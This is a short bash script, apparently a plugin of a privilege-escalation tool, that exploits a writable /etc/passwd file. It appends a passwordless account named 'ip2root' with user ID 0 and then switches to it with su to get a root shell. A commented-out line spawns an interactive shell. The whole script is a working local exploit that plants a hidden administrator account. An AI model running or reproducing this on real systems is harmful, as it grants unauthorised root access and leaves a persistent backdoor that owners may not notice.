#!/bin/bash
# [PLUGIN PRIVESC] /etc/passwd rights exploitation

echo 'ip2root::0:0::/root:/bin/bash' >> /etc/passwd
#python3 -c 'import pty; pty.spawn("/bin/bash")'
su - ip2root